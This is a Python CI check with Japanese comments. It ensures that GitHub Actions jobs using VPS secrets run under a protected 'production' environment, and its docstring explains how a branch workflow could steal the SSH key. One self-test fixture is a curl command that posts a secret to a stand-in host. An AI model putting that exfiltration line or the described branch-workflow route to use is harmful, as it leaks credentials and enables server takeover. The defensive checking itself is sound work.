#!/usr/bin/env python3
"""VPS の鍵を使うジョブが Environment 越しになっているかを見る。

## ⚠ 何を守っているか

`VPS_SSH_KEY` などをリポジトリ secret のまま置くと、**どのブランチのワークフローからでも
読める**。つまり akiba-infra に書ける者は誰でも、枝ブランチに `on: push` のワークフローを
1本置くだけで鍵を持ち出せる（→ SSH → sudo のデプロイスクリプト → **VPS の root**）。

⚠ **main を一度も通らないので、ブランチ保護でも人のマージでも止まらない。**
CI も、検査を待たずに push の瞬間に走る。

Environment（`production`）に移して Deployment branches を main だけに絞ると、
main 以外のブランチのワークフローからは読めなくなる。この検査は、その取り決めが
**あとから足したワークフローで崩れないこと**を見張る。

## 使い方

    python3 ops/tools/check_secrets_scope.py            # 検査
    python3 ops/tools/check_secrets_scope.py --self-test # 検出力テスト（わざと壊して落ちるか）
"""
from __future__ import annotations

import glob
import sys
import tempfile
from pathlib import Path

import yaml

ENVIRONMENT = "production"
MARK = "secrets.VPS_"


def offenders(paths: list[str]) -> list[tuple[str, str, str]]:
    """(ファイル, ジョブ名, 理由) の一覧を返す。空なら合格。"""
    bad: list[tuple[str, str, str]] = []
    for path in sorted(paths):
        try:
            doc = yaml.safe_load(Path(path).read_text(encoding="utf-8"))
        except yaml.YAMLError as exc:  # 壊れた YAML は検査の対象外にせず落とす
            bad.append((path, "-", f"YAML として読めない: {exc}"))
            continue
        for name, body in ((doc or {}).get("jobs") or {}).items():
            # ⚠ ジョブ全体を文字列にしてから探す。steps の奥や env: の中に
            #   書かれていても拾えるようにするため。
            if MARK not in yaml.safe_dump(body, allow_unicode=True):
                continue
            env = body.get("environment")
            # environment: は文字列でも {name: ...} でも書ける
            env_name = env.get("name") if isinstance(env, dict) else env
            if env_name != ENVIRONMENT:
                bad.append(
                    (path, name, f"VPS の鍵を使うのに environment が {env_name!r}")
                )
    return bad


def self_test() -> int:
    """⚠ 検査そのものが仕事をしているかを見る。

    akiba-infra には「検査を書いたのに、式を抜き出せないまま緑になった」という
    失敗がある（imggen の許可リスト）。**わざと違反を作って、落ちることを確かめる。**
    """
    ok = True

    def case(desc: str, text: str, want_bad: bool) -> None:
        nonlocal ok
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "w.yml"
            path.write_text(text, encoding="utf-8")
            got_bad = bool(offenders([str(path)]))
            if got_bad == want_bad:
                print(f"  ok   {desc}")
            else:
                print(f"  NG   {desc}（期待 {want_bad} / 実際 {got_bad}）")
                ok = False

    good = """
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: echo "${{ secrets.VPS_SSH_KEY }}" > key
"""
    case("正しい形は素通りする", good, want_bad=False)

    case(
        "⚠ environment を書き忘れたら落ちる",
        good.replace("    environment: production\n", ""),
        want_bad=True,
    )
    case(
        "⚠ 別の environment 名では落ちる",
        good.replace("production", "staging"),
        want_bad=True,
    )
    case(
        "environment を name: で書く形も通す（誤検知しない）",
        good.replace("environment: production", "environment:\n      name: production"),
        want_bad=False,
    )
    case(
        "鍵を使わないジョブは environment 無しでよい",
        """
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo hello
""",
        want_bad=False,
    )
    case(
        "⚠ steps の奥に隠れていても見つける",
        """
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: ずっと下のほう
        env:
          KEY: ${{ secrets.VPS_SSH_KEY }}
        run: ssh -i key host
""",
        want_bad=True,
    )
    case(
        "⚠ 新しく足したワークフローでも見つける（on: push の抜け道）",
        """
on: push
jobs:
  innocent:
    runs-on: ubuntu-latest
    steps:
      - run: curl -d "${{ secrets.VPS_HOST }}" https://example.invalid
""",
        want_bad=True,
    )
    return 0 if ok else 1


def main() -> int:
    if "--self-test" in sys.argv:
        return self_test()

    bad = offenders(glob.glob(".github/workflows/*.yml"))
    if bad:
        for path, job, why in bad:
            print(f"::error file={path}::ジョブ {job}: {why}")
        print()
        print("VPS の鍵を使うジョブには `environment: production` が要ります。")
        print("（リポジトリ secret のままだと、どの枝ブランチからでも読めてしまうため）")
        return 1
    print("VPS の鍵を使うジョブはすべて environment 越しにゃん")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
